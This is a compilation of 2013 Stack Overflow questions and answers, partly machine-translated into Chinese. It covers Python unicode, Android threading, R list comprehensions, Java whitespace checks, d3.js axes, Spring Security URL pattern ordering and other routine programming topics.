# python - Pythons 2.7.x docs about Unicode and why this still works?

> ID：15998713
> 
> 赞同：0
> 
> 时间：2013-04-14T11:48:28.693
> 
> 标签：python, string, unicode, 8-bit

According to the Python 2.7.x documentation:

> The `unicode()` constructor has the signature `unicode(string[, encoding, errors])`. All of its arguments should be 8-bit strings. The first argument is converted to Unicode using the specified encoding; if you leave off the encoding argument, the ASCII encoding is used for the conversion, **so characters greater than 127 will be treated as errors:**
> 
> ```
>  >>> unicode('abcdef' + chr(255))    
>    Traceback (most recent call last):
>    ...
>    UnicodeDecodeError: 'ascii' codec can't decode byte 0xff in position 6:
>    ordinal not in range(128) 
> ```

So why does this work with Japanese characters in it?:

```
TestStr = "サーバ移設"
print TestStr
サーバ移設 
```

and why does this work too?:

```
TestStr = unicode("サーバ移設")
print TestStr
サーバ移設 
```

I would have expected an unicode decode error since the Japanese characters are not within the 8bit string range.

# android - 由于特定方法，对话框出现缓慢，我怎么能在这里使用线程？

> ID：15998714
> 
> 赞同：2
> 
> 时间：2013-04-14T11:48:37.243
> 
> 标签：android, multithreading, dialog

我想了解在这种情况下我应该如何使用线程？我有一个对话框出现，里面有一个文本视图。textview 从需要大约 1 秒才能完成的方法中接收其信息。但我希望对话框立即出现，并且我希望将数据加载到线程中，然后我想让特定数据在 1 秒后出现在对话框中（现在已经在屏幕上显示了 1 秒）。

所以我有一个`GetData()`返回数据（字符串）的方法。我有单击按钮后出现的对话框：

```
Button.setOnClickListener(new View.OnClickListener() {

@Override
public void onClick(View v) {

    final Dialog dialog = new Dialog(getActivity());
    dialog.getWindow().setBackgroundDrawable(new ColorDrawable(android.graphics.Color.TRANSPARENT));
    dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
    TextView tv= (TextView) dialog.findViewById(R.id.tv1);
    tv.setText(GetData());    
    dialog.show;
    }
} 
```

我怎么能做到？提前致谢！

好的，Asynctask，但是我怎样才能触摸里面的文本视图呢？

```
//AsyncTask

    public class DefaultAsyncTask extends
    AsyncTask<Void, Integer, Void> {

        int myProgress;

        @Override
        protected void onPostExecute(Void result) {

        }

        @Override
        protected void onPreExecute() {
            // TODO Auto-generated method stub

        }

        @Override
        protected Void doInBackground(Void... params) {

            return null;
        }

 } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T12:20:14.833

将耗时的代码封装在一个`AsyncTask`附加到`Dialog`的事件中：

任务：

```
public class MyTask extends AsyncTask<Void,Void,String>{
    @Override
    protected String doInBackground(Void... voids) {
        //-- put get data code here --
        //-- if this takes too much time, repeatedly check "isCancelled()", and exit if its true--
        return "the string result";
    }
} 
```

用法：

```
public void ShowDialog(Context c){
    Dialog d = new Dialog(c);
    final TextView t = new TextView(c);
    d.setContentView(t);

    //--setup the task to update text--
    final MyTask w = new MyTask(){
        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            t.setText(s);
        }
    };

    //--setup the dialog to run task when shown--
    d.setOnShowListener(new DialogInterface.OnShowListener() {
        @Override
        public void onShow(DialogInterface dialogInterface) {
            w.execute();
        }
    });

    //--setup the dialog to kill task if its dismissed--
    d.setOnDismissListener(new DialogInterface.OnDismissListener() {
        @Override
        public void onDismiss(DialogInterface dialogInterface) {
            w.cancel(true);
        }
    });

    //-- show the dialog--
    d.show();
} 
```

上面的代码只是一个例子，优雅的方法是扩展`Dialog`类并将此代码放在那里使其成为`TaskRunnerDialog`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T12:09:05.337

使用[异步任务](http://developer.android.com/reference/android/os/AsyncTask.html)

希望这会有所帮助，亚龙

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-14T12:04:03.290

普通线程不会运行任何 ui 组件，使用此 uithread 会产生错误

```
runOnUiThread(new Runnable() {
                 public void run() {

final Dialog dialog = new Dialog(getActivity());
dialog.getWindow().setBackgroundDrawable(new   ColorDrawable(android.graphics.Color.TRANSPARENT));
dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
TextView tv= (TextView) dialog.findViewById(R.id.tv1);
tv.setText(GetData());    
dialog.show;

                }
            }); 
```

# opencv - 'mingw32-make' is not recognized in cmd while integrate Qt 5.0.2 and OpenCV 2.4.4 with CMAKE 2.8.10.2 in Windows 7

> ID：15998715
> 
> 赞同：2
> 
> 时间：2013-04-14T11:48:38.160
> 
> 标签：opencv, cmake, qt5, mingw32

I was installing QT5 and OpenCV 2.4.4 with CMAKE 2.8.10.2..

I was following the instruction from [here](https://stackoverflow.com/questions/14919186/qt-creator-5-0-1-with-opencv-2-3-4-on-windows/15268560#15268560) and [here](http://www.slideshare.net/luigidr/installing-opencv-242-with-qt) . The problem is, when I want to compile the OpenCV library with cmd, 'mingw32-make' is not recognized as internal or external command, operable program or batch file. I don't know how to react, I've follow the instruction step by step..

Thanks for your answers :)

===============================

This question has been answered :)
the answer is I didn't put the path contains mingw32-make.exe (Qt5.0.2\Tools\MinGW\bin) to system variable. different version different path, made me confuse.

So, if you want to integrate Qt 5.0.2 and OpenCV 2.4.4 with CMAKE 2.8.10.2 in Windows 7, use instructions from two links that I mention it above, it works! Thanks:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T04:14:20.797

在开始菜单中，您可以找到 Qt MinGW 的预配置环境变量命令提示链接。如果您正在使用`Qt 5.0.2 for Windows 32-bit (MinGW 4.7, 650 MB)`，您可能会发现类似`Qt 5.0.2 for Desktop (MinGW 4.7)`. 将它用于您的命令。请确保您使用的是 mingw32 版本的 Qt，否则您要查找的命令是`nmake`.

# r - R中的列表理解

> ID：15998716
> 
> 赞同：44
> 
> 时间：2013-04-14T11:48:38.953
> 
> 标签：r

有没有办法在 R 中实现列表理解？

像蟒蛇：

```
sum([x for x in range(1000) if x % 3== 0 or x % 5== 0]) 
```

在 Haskell 中也一样：

```
sum [x| x<-[1..1000-1], x`mod` 3 ==0 || x `mod` 5 ==0 ] 
```

在 R 中应用它的实际方法是什么？

缺口

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2013-04-14T11:56:56.087

像这样的东西？

```
l <- 1:1000
sum(l[l %% 3 == 0 | l %% 5 == 0]) 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-04-14T11:55:21.250

是的，列表理解在 R 中是可能的：

```
sum((1:1000)[(1:1000 %% 3) == 0 | (1:1000 %% 5) == 0]) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-09-20T16:20:26.727

而且，（有​​点）对scala的理解：

```
for(i in {x <- 1:100;x[x%%2 == 0]})print(i) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-04-10T09:14:10.960

另一种方式

```
sum(l<-(1:1000)[l %% 3 == 0 | l %% 5 == 0]) 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-11-13T14:47:32.120

Revolution Analytics的[foreach](https://cran.r-project.org/web/packages/foreach/vignettes/foreach.pdf)包为我们提供了一个方便的界面来列出 R 中的理解。[https://www.r-bloggers.com/list-comprehensions-in-r/](https://www.r-bloggers.com/list-comprehensions-in-r/)

例子

从列表中返回不等于元组的数字：

> Python
> 
> ```
> list_a = [1, 2, 3]
> list_b = [2, 7]
> 
> different_num = [(a, b) for a in list_a for b in list_b if a != b]
> 
> print(different_num) 
> 
> # Output: 
> [(1, 2), (1, 7), (2, 7), (3, 2), (3, 7)] 
> ```

* * *

> R
> 
> ```
> require(foreach)
> 
> list_a = c(1, 2, 3)
> list_b = c(2, 7)
> 
> different_num  <- foreach(a=list_a ,.combine = c ) %:% foreach(b=list_b) %:% when(a!=b) %do% c(a,b)
> 
> print(different_num)
> 
> # Output:
>          [[1]]
>          [1] 1 2
> 
>          [[2]]
>          [1] 1 7
> 
>          [[3]]
>          [1] 2 7
> 
>          [[4]]
>          [1] 3 2
> 
>          [[5]]
>          [1] 3 7 
> ```

编辑：
foreach 包对于某些任务非常慢。[R](https://stat.ethz.ch/pipermail/r-devel/2007-December/047698.html)的列表推导中给出了更快的列表推导实现

```
. <<- structure(NA, class="comprehension")

comprehend <- function(expr, vars, seqs, guard, comprehension=list()){
  if(length(vars)==0){  # base case of recursion
    if(eval(guard)) comprehension[[length(comprehension)+1]] <- eval(expr)
  } else {
    for(elt in eval(seqs[[1]])){
      assign(vars[1], elt, inherits=TRUE)
      comprehension <- comprehend(expr, vars[-1], seqs[-1], guard, 
                                  comprehension)
    }
  }
  comprehension
}

## List comprehensions specified by close approximation to set-builder notation:
##
##   { x+y | 0<x<9, 0<y<x, x*y<30 } ---> .[ x+y ~ {x<-0:9; y<-0:x} |  x*y<30 ]
##

"[.comprehension" <- function(x, f,rectangularizing=T){
  f <- substitute(f)
  ## First, we pluck out the optional guard, if it is present:
  if(is.call(f) && is.call(f[[3]]) && f[[3]][[1]]=='|'){
    guard <- f[[3]][[3]]
    f[[3]] <- f[[3]][[2]]
  } else {
    guard <- TRUE
  }
  ## To allow omission of braces around a lone comprehension generator,
  ## as in 'expr ~ var <- seq' we make allowances for two shapes of f:
  ##
  ## (1)    (`<-` (`~` expr
  ##                   var)
  ##              seq)
  ## and
  ##
  ## (2)    (`~` expr
  ##             (`{` (`<-` var1 seq1)
  ##                  (`<-` var2 seq2)
  ##                      ...
  ##                  (`<-` varN <- seqN)))
  ##
  ## In the former case, we set gens <- list(var <- seq), unifying the
  ## treatment of both shapes under the latter, more general one.
  syntax.error <- "Comprehension expects 'expr ~ {x1 <- seq1; ... ; xN  <- seqN}'."
  if(!is.call(f) || (f[[1]]!='<-' && f[[1]]!='~'))
    stop(syntax.error)
  if(is(f,'<-')){ # (1)
    lhs <- f[[2]]
    if(!is.call(lhs) || lhs[[1]] != '~')
      stop(syntax.error)
    expr <- lhs[[2]]
    var <- as.character(lhs[[3]])
    seq <- f[[3]]
    gens <- list(call('<-', var, seq))
  } else { # (2)
    expr <- f[[2]]
    gens <- as.list(f[[3]])[-1]
    if(any(lapply(gens, class) != '<-'))
      stop(syntax.error)
  }
  ## Fill list comprehension .LC
  vars <- as.character(lapply(gens, function(g) g[[2]]))
  seqs <- lapply(gens, function(g) g[[3]])
  .LC <- comprehend(expr, vars, seqs, guard)

  ## Provided the result is rectangular, convert it to a vector or array
  if(!rectangularizing) return(.LC)
  tryCatch({
     if(!length(.LC))
      return(.LC)
  dim1 <- dim(.LC[[1]])
  if(is.null(dim1)){
    lengths <- sapply(.LC, length)
    if(all(lengths == lengths[1])){ # rectangular
      .LC <- unlist(.LC)
      if(lengths[1] > 1) # matrix
        dim(.LC) <- c(lengths[1], length(lengths))
    } else { # ragged
      # leave .LC as a list
    }
  } else { # elements of .LC have dimension
    dim <- c(dim1, length(.LC))
    .LC <- unlist(.LC)
    dim(.LC) <- dim
  }
  return(.LC)
  }, error = function(err) {
    return(.LC)
  })

} 
```

这个实现比 foreach 更快，它允许嵌套理解、多个参数和参数范围。

```
 N <- list(10,20)
.[.[c(x,y,z)~{x <- 2:n;y <- x:n;z <- y:n} | {x^2+y^2==z^2 & z<15}]~{n <- N}]

[[1]]
[[1]][[1]]
[1] 3 4 5

[[1]][[2]]
[1]  6  8 10

[[2]]
[[2]][[1]]
[1] 3 4 5

[[2]][[2]]
[1]  5 12 13

[[2]][[3]]
[1]  6  8 10 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2021-02-10T00:38:42.840

这是多年后的事了，但现在 CRAN 上有三个列表理解包。每个都有略微不同的语法。按字母顺序：

```
library(comprehenr)
sum(to_vec(for(x in 1:1000) if (x %% 3 == 0 | x %% 5 == 0) x))
## [1] 234168

library(eList)
Sum(for(x in 1:1000) if (x %% 3 == 0 | x %% 5 == 0) x else 0)
## [1] 234168

library(listcompr)
sum(gen.vector(x, x = 1:1000, x %% 3 == 0 | x %% 5 == 0))
## [1] 234168 
```

此外，以下内容仅在 github 上。

```
# devtools::install.github("mailund/lc")
library(lc)
sum(unlist(lc(x, x = seq(1000), x %% 3 == 0 | x %% 5 == 0)))
## [1] 234168 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2021-01-16T08:41:36.110

我希望可以自我推广我的包**listcompr**，它实现了 R 的列表理解语法。

问题中的示例可以通过以下方式解决：

```
library(listcompr)
sum(gen.vector(x, x = 1:1000, x %% 3 == 0 || x %% 5 == 0))

## Returns: 234168 
```

由于 listcompr 对条件进行逐行（而不是矢量虎钳）评估，因此如果使用`||`或`|`使用逻辑运算符则没有区别。它接受任意多个参数：首先，转换为列表或向量条目的基本表达式。接下来，指定变量范围和条件的任意多个参数。

更多示例可以在 listcompr 的 github 存储库的 readme 页面上找到：[https ://github.com/patrickroocks/listcompr](https://github.com/patrickroocks/listcompr)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-07-03T19:32:32.650

此列表理解形式：

```
[item for item in list if test] 
```

在 R 中使用布尔索引非常简单。但是对于更复杂的表达式，例如实现矢量重新缩放（我知道这也可以通过 scales 包完成），在 Python 中很容易：

```
x = [1, 3, 5, 7, 9, 11] # -> [0.0, 0.2, 0.4, 0.6, 0.8, 1.0]
[(xi - min(x))/(max(x) - min(x)) for xi in x] 
```

但在 R 中，这是我能想到的最好的。想知道是否有更好的东西：

```
sapply(x, function(xi, mn, mx) {(xi-mn)/(mx-mn)}, mn = min(x), mx = max(x)) 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-07-10T02:39:00.167

您可以将随机数序列转换为二进制序列，如下所示：

```
x=runif(1000)
y=NULL
for (i in x){if (i>.5){y<-c(y,1)}else{y=c(y,-1)}} 
```

这可以概括为在任何列表上操作到另一个列表，基于：

```
x = [item for item in x if test == True] 
```

测试可以使用 else 语句不附加列表 y。

对于手头的问题：

```
x <- 0:999 
y <- NULL 
for (i in x){ if (i %% 3 == 0 | i %% 5 == 0){ y <- c(y, i) }}
sum( y ) 
```

# java - 为什么 Java Character.isSpaceChar(char) 不将水平制表符视为空格？

> ID：15998718
> 
> 赞同：-4
> 
> 时间：2013-04-14T11:49:08.113
> 
> 标签：java, regex, tabs, whitespace

为什么`Character.isSpaceChar('\u0009')`在 Java 1.7 中返回 false？此字符也称为 '\t' 或基于字符串的英语：“水平制表符”。根据我的眼睛和[维基百科](http://en.wikipedia.org/wiki/Whitespace_character#Unicode)的相似，这个字符**是**空格。但是Java报告错误！

我还尝试在[unicode.org](http://www.unicode.org)上找到一些打印所有字符类别的列表或表格（我的最终目标是找到代码点和类别 Zi、Zp、Zs* 之间的官方映射）无济于事。

*其实现在我又撒谎了。我的最终目标是测试 Java 计算空格的能力并编写我自己的库，一个可以实际使用的库（他还应该删除换行符）。或者我应该把这门科学留给著名的`\s`模式吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-14T11:50:35.527

> 为什么`Character.isSpaceChar('\u0009')`在 Java 1.7 中返回 false？

因为`isSpaceChar`不检查*空格*字符，[所以它检查*空格*](http://docs.oracle.com/javase/7/docs/api/java/lang/Character.html#isSpaceChar%28char%29)（Unicode 有多个空格字符）。

如果你想检查*whitespace*，有[`isWhitespace`](http://docs.oracle.com/javase/7/docs/api/java/lang/Character.html#isWhitespace%28char%29)（它使用空白的*Java*定义）。

是的，`\s`确实检查（Java 的定义）空白（不仅仅是空格），[特别是`[ \t\n\x0B\f\r]`](http://docs.oracle.com/javase/7/docs/api/java/util/regex/Pattern.html).

如果你想在你的程序中使用空格的*Unicode*定义，我不会立即看到一个`Character`方法或一个*预定义*的正则表达式类说它这样做。不过，Unicode 联盟提供了很多[代码图表](http://www.unicode.org/charts/uca/)，包括[这个](http://unicode.org/charts/uca/chart_Whitespace.html)用于空白的代码图表，所以它应该很容易创建。不要相信我的话（只是快速阅读图表），但例如：

```
Pattern p = new Pattern("[ \\u0009-\\u000D\\u0085\\u180E\\u2028\\u2029\\u3000\\u1680\\u2000-\\u2006\\u2008-\\u200A\\u205F\\u00A0\\u2007\\u202F]"); 
```

...看起来它可能匹配它。或打开这些值的等效功能。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-14T11:51:53.967

根据[文档](http://docs.oracle.com/javase/6/docs/api/java/lang/Character.html#isSpaceChar%28char%29)，有三类字符被识别为空格：

*   SPACE_SEPARATOR
*   LINE_SEPARATOR
*   PARAGRAPH_SEPARATOR

Tab 不适合这些类别中的任何一个（它是`HORIZONTAL TABULATION`），因此`isSpaceChar`正确返回`false`它。

> 我的最终目标是测试 Java 计算空格的能力

该`Character.isWhitespace`功能更具包容性 - 特别是它包括`HORIZONTAL TABULATION`类别。也许这就是您应该使用的功能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T11:54:22.263

根据它的Javadoc：

> 确定指定字符是否为 Unicode 空格字符。当且仅当 Unicode 标准将字符指定为空格字符时，该字符才被视为空格字符。如果角色的一般类别类型是以下任何一种，则此方法返回 true：
> 
> SPACE_SEPARATOR LINE_SEPARATOR PARAGRAPH_SEPARATOR

[http://docs.oracle.com/javase/7/docs/api/java/lang/Character.html#isSpaceChar(char)](http://docs.oracle.com/javase/7/docs/api/java/lang/Character.html#isSpaceChar(char))

所以检查Unicode，而不是Java。

# c# - C# 的二进制 Erlang Term 序列化程序

> ID：15998719
> 
> 赞同：1
> 
> 时间：2013-04-14T11:49:25.007
> 
> 标签：c#, erlang, bert-rpc

C# 是否有任何 BERT 或 BERT-RPC 实现？

在[http://bert-rpc.org/](http://bert-rpc.org/)上没有列出 C# 实现。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T11:49:25.007

至少有一个（用 F# 编写，可从 C# 和通常任何 .NET 语言使用）称为Filbert，可在 Github ( [https://github.com/theburningmonk/Filbert](https://github.com/theburningmonk/Filbert) ) 和 NuGet上找到

# php - 在 php / CodeIgniter 中附加数组

> ID：15998721
> 
> 赞同：-1
> 
> 时间：2013-04-14T11:49:32.103
> 
> 标签：php, arrays, codeigniter

我尝试在 if 条件中附加我的数据数组。我正在使用`array_push`函数来执行它这是我第一次使用此函数来附加数组。我正在使用条件，因此如果用户在表单中添加了值，它将更新该字段，否则它不会影响该字段。问题是它没有更新数据库并且无法设置字段，因为它在“字段列表”中显示未知未知列“0”

```
$fid = 2;
$password = "test_pass";
$title = "new title of folder";
$f_access = 1;
$newName = TRUE;

$data = array(
              'name' => $title,
              'access_type' => $f_access
              );

if($newName)
{
    $data2 = "'icon' => $newName";
    array_push($data, $data2);
}

if($password)
{
    $data3 =   "'password' => $password";
    array_push($data, $data3);
}

$this->db->where('id', $fid);
$this->db->update('folders', $data); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T11:53:37.783

要将新数据插入到 key => value 数组中，您必须使用以下形式：

```
 $arr['key'] = value; 
```

作为

```
 $data['password'] = $password; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T15:29:59.193

```
$data = array(
          'name' => $title,
          'access_type' => $f_access
          );

if(!empty($newName))
    $data['icon'] = $newName;

if(!empty($password))
    $data['password'] = $password; 
```

这样您就可以轻松地在数组中推送新项目。

# javascript - 如何为过滤的流沙数据分配一个类？

> ID：15998724
> 
> 赞同：1
> 
> 时间：2013-04-14T11:49:54.477
> 
> 标签：javascript, jquery, filter, filtering, quicksand

我在搜索[流沙预过滤页面的链接](https://stackoverflow.com/questions/10491313/jquery-quicksand-linking-to-prefiltered-page)时找到了这个答案，我对代码进行了一些编辑以使我的 url 更友好，数据过滤为 4 列，我想为第 1 列的项目分配一个特定的类和列 #4 的项目的另一个类，所有代码如果运行良好，除了将类分配给过滤数据的部分。请帮助我，我将非常感谢您的努力。

```
$(document).ready(function() {
// get the action filter option item on page load
var $filterType = $('#sidebar .filter a.active').attr('data-value');

// get and assign the ourHolder element to the
// $holder varible for use later
var $holder = $('.filter-container');

// clone all items within the pre-assigned $holder element
var $data = $holder.clone();

var $button = $('#sidebar .filter a');

var $all = $('.filter-container .part').data('type') === 'all';

// reset the active class on all the buttons
$button.removeClass('active');

// assign the class of the clicked filter option
// element to our $filterType variable
var $filtered = 'greases';

$('a[data-value=' + $filtered + ']').addClass('active dark');

var $filteredData = $data.find('.part[data-type~=' + $filtered + ']').show();

    // Assigning the classes    
$filteredData.removeClass('alpha omega').each(function(index) {
    if (index % 4 == 0) $(this).addClass('alpha');
    if (index % 4 == 3) $(this).addClass('omega');
});

    // call quicksand and assign transition parameters
$holder.quicksand($filteredData, {
    duration: 750,
    easing: 'easeInOutQuad'
});
}); 
```

# xml - 为什么默认的 Apache XML 配置文件会解析？

> ID：15998725
> 
> 赞同：0
> 
> 时间：2013-04-14T11:49:55.197
> 
> 标签：xml, apache

我在 Ubuntu 服务器中注意到了这个默认的 Apache 配置：

```
<Directory />
    Options FollowSymLinks
    AllowOverride None
</Directory>
<Directory /var/www/>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride None
    Order allow,deny
    allow from all
</Directory> 
```

请注意`<Directory />`指定正在配置的目录的行是`/`（与 比较`<Directory /var/www/>`）。但是，在 XML 中，以`/`字符结尾的标记指定了一个自闭合标记。

因此，我是否应该得出结论，默认的 Apache 配置看起来像 XML，但并不意味着是 XML。它也没有文档类型并支持`#`注释。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T18:20:53.883

你已经回答了你自己的问题。它不是 XML。我不知道他们为什么选择使用表面上类似于 XML 的东西，但这就是他们所做的。

# trigonometry - 如何计算角度

> ID：15998732
> 
> 赞同：0
> 
> 时间：2013-04-14T11:50:30.997
> 
> 标签：trigonometry

我正在创建一个游戏，如果敌人在一定范围内并且在玩家面前，玩家可以攻击敌人。我已经计算出半径距离并使其面向前方，具体取决于玩家面向的方式，但我如何创建角度，使其看起来像玩家的锥形。我有一个图像。细绿线是我计算出的半径，但我如何计算红色圆锥。

这是更好理解的图像

[http://tinypic.com/view.php?pic=28v63h0&s=6](http://tinypic.com/view.php?pic=28v63h0&s=6)

这是我到目前为止所做的

包裹

```
{
    import flash.display.MovieClip;
    import flash.events.Event;
    import flash.events.KeyboardEvent;
    import flash.events.MouseEvent;
    import flash.ui.Keyboard;

    public class Player extends MovieClip
    {

        var radius:Number = 60;

        public function Player()
        {
            addEventListener(Event.ENTER_FRAME, Update);
        }   

        function Update(event:Event)
        {       
            var radiusx:Number = x+radius*Math.cos(rotation/180*Math.PI);
            var radiusy:Number = y+radius*Math.sin(rotation/180*Math.PI);

            // Rotate to mouse;
            var dx = parent.mouseX - x;
            var dy = parent.mouseY - y;
            var angle = Math.atan2(dy,dx) / Math.PI * 180;
            rotation = angle;

        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:58:03.553

您可以使用切线的定义：

```
tan(a/2) = s/(2d) 
```

哪里`s`是敌人的大小（直径），是到敌人`d`的最短距离。这`a`是总可见角度（两条红线之间）。

# javascript - JavaScript - 从另一个页面的文本区域获取文本

> ID：15998736
> 
> 赞同：1
> 
> 时间：2013-04-14T11:50:43.220
> 
> 标签：javascript, arrays, xhtml

我想通过解析来自同一站点上另一个页面上的文本区域、div 等的值来填充数组。（穷人的数据库。）。它是一个托管站点，所以我只有 JavaScript，没有 jquery，更不用说 php 等。我可以进行解析，但首先我必须能够从站点内的另一个页面获取文本。这个前夕在香草 JavaScript 中是可能的吗？

这是计划。我设置了一个数据页面（所以我会知道它的 URL），其中包含一个包含数据的字段或 div，格式化以便我可以解析它。在进入另一个需要数据的页面时，我将运行一个 JS 例程来读取数据并填充我的 JS 数组。

但是我不知道如何在 JS 中引用这个其他页面，更不用说在上面获取对象的内容了。跨域安全应该不是问题，但语法肯定是！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:00:10.917

如何使用 IndexedDB。看看：[https ://developer.mozilla.org/en-US/docs/IndexedDB](https://developer.mozilla.org/en-US/docs/IndexedDB)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T10:59:42.367

我想出的答案涉及在数据页面上设置表单（每个 DB 条目一个表单：日期、时间、内容、标题等）。然后在调用页面上创建一个显示数据页的 iframe。（一旦测试结束，这个 iframe 就会隐藏。）我从 iframed 文档中获取 BODY 内容：

```
var iFrame=document.getElementById("iframe_id");
var myDoc;
if (iFrame.contentDocument) myDoc = iFrame.contentDocument; // FF, etc.
else if (iFrame.contentWindow) myDoc = iFrame.contentWindow; // IE
var iFrameBody = myDoc.getElementsByTagName('body')[0]; 
```

之后，有了文档的正文 HTML，就很容易找到各种形式；每个都有“dataform”类，所以我只获取类名为“dataform”的所有元素，这会导致每个表单上的各个字段/值。等等等等。

仍在开发中，但基本程序运行良好，而且都是原生 JavaScript。

# javascript - 使用 d3.js 的 x.ticks() 中的文本不正确

> ID：15998742
> 
> 赞同：0
> 
> 时间：2013-04-14T11:51:20.467
> 
> 标签：javascript, d3.js

在我正在处理的一个条形图中，我创建了 x 轴的平行刻度，以便为查看器提供参考。问题出在我添加的文本中。文本的顺序应该是相反的，我不知道如何保持正确的顺序。

我明白问题出在这里：

```
 chart.selectAll("line")
        .data(y.ticks(4))
    .enter().append("line")
        .attr("x1", 60)
        .attr("x2", (barWidth + 50) * data.length)
        .attr("y1", y)
        .attr("y2", y)
        .style("stroke", "#ccc");

    chart.selectAll(".rule")
        .data(y.ticks(4))
    .enter().append("text")
        .attr("class", "rule")
        .attr("x", 30)
        .attr("y", y)
        .attr("text-anchor", "middle")
        .text(String); 
```

但我不知道如何解决它。

[这是 jsFiddle 中的代码](http://jsfiddle.net/7fPxd/)。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:22:57.020

问题是y坐标是从顶部而不是底部计算的，因此您需要反转所有值。更新的 jsfiddle 在[这里](http://jsfiddle.net/7fPxd/1/)；相关变化如下。

```
var y = d3.scale.linear()
      .domain([0, d3.max(data, function(datum) { return datum.value; })])
      .rangeRound([height-20, 0]); 
```

反转值`rangeRound`，使最小值映射到顶部。

```
chart.selectAll("rect")
  .data(data)
  .enter()
  .append("svg:rect")
  .attr("x", function(datum, index) { return x(index); })
  .attr("y", function(datum) { return y(datum.value); })
  .attr("height", function(datum) { return height - y(datum.value); })
      ... 
```

更改了计算方式`y`和`height`相应的计算方式。

# python - 从循环中转义文件中的行，但仍将文件的其余部分作为字符串获取

> ID：15998745
> 
> 赞同：0
> 
> 时间：2013-04-14T11:51:38.797
> 
> 标签：python, nested-loops, getline

以下代码从 txt 文件中获取每一行。如果该行是“References\n”，则文件应继续获取行，但附加到另一个字符串，删除后续的 '\n' 实例。我应该如何处理嵌套循环和中断？

```
for file in os.listdir(txtdir):
    if file <> '.DS_Store':
        linenum = 1
        refindicator = 0
        AppendixCheck = 0
        print 'Opening ' + str(file) + '...'
        for line in open(txtdir + file):
            if AppendixCheck == 0:
                #take title from the first line
                if linenum == 1:
                    title = line.replace(",","")
                    print "Title: " + title
                linenum +=1
                #checking for "references\n" line
                if line == "References\n":
                    refindicator +=1
                #after references are found
                if line =='Appendix\n':
                    AppendixCheck +=1
                if refindicator >0:
                    reflist += getline().replace('\n','')
                #reflist = line.split(',')
        print reflist 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:22:55.233

这是我找到的解决方案：

```
for file in os.listdir(txtdir):
    if file <> '.DS_Store':
        linenum = 1
        refindicator = 0
        AppendixCheck = 0
        refdump = ''
        title = ''
        print 'Opening ' + str(file) + '...'
        for line in open(txtdir + file):
            #The first blank line marks the end of the title
            if line == '\n':
                linenum +=1
            #Only works until appendix is breached
            if AppendixCheck == 0:
                #take title from the first line
                if linenum == 1:
                    title += line.replace('\n','').replace(',','').replace('  ', '')
                    print "Title: " + title
                #checking for "references\n" line
                if line == "References\n":
                    refindicator +=1
                #after references are found
                if 'Appendix' in line:
                    AppendixCheck +=1
                if refindicator >0:
                    refdump += line.replace('\n','')
        reflist = refdump.split(',')
        print reflist 
```

# spring - Spring Security 中的拦截 url 模式的顺序

> ID：15998746
> 
> 赞同：4
> 
> 时间：2013-04-14T11:51:47.170
> 
> 标签：spring, spring-security

在 appSecurity.xml 我有这个：

拦截 url 模式="/users/profile/**" 访问="hasRole('VIEW_PROFILES')"。

拦截 url 模式="/users/profile/edit/**" 访问="hasRole('EDIT_PROFILES')"

我有一个页面 /users/profiles/edit/addnew ，当具有角色 VIEW_PROFILES 的用户尝试访问此页面时，他成功获取了该页面，但对具有角色 EDIT_PROFILES 的用户的访问被阻止。

我做错了什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-14T15:35:07.650

由于`"/users/profile/edit/"`比 更具体`"/users/profile/"`，因此应将其放在列表的较高位置。

**为什么**

> 模式总是按照它们定义的顺序进行评估。因此，更具体的模式在列表中定义得比不太具体的模式更高，这一点很重要。这反映在我们上面的示例中，其中更具体的 /secure/super/ 模式看起来比不太具体的 /secure/ 模式更高。如果它们被反转，/secure/ 模式将始终匹配，而 /secure/super/ 模式将永远不会被评估。

**来源：[核心安全过滤器](http://docs.spring.io/spring-security/site/docs/4.0.x/reference/html/core-web-filters.html#filter-security-interceptor)**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-22T16:21:09.843

John Farrelly 和 Ritesh 都是正确的。模式按列出的`intercept-url`顺序匹配。一旦找到匹配项，指定的其余模式将被忽略。这就是为什么您应该更早地列出更具体的模式的原因。

在您的情况下，*/users/profile/edit/somepage*的模式与第一个模式中指定的模式匹配`intercept-url`，因此 Spring 正在适当地检查相关用户是否具有指定的访问角色。显然，您的 EDIT_PROFILES 用户没有 VIEW_PROFILES 权限，因此他们被拒绝访问。同样，您将 ../edit/ 访问权限限制*为*具有 EDIT_PROFILES 权限的用户的意图被前面的语句破坏了，该语句授予具有 VIEW_PROFILES 权限的用户访问权限。

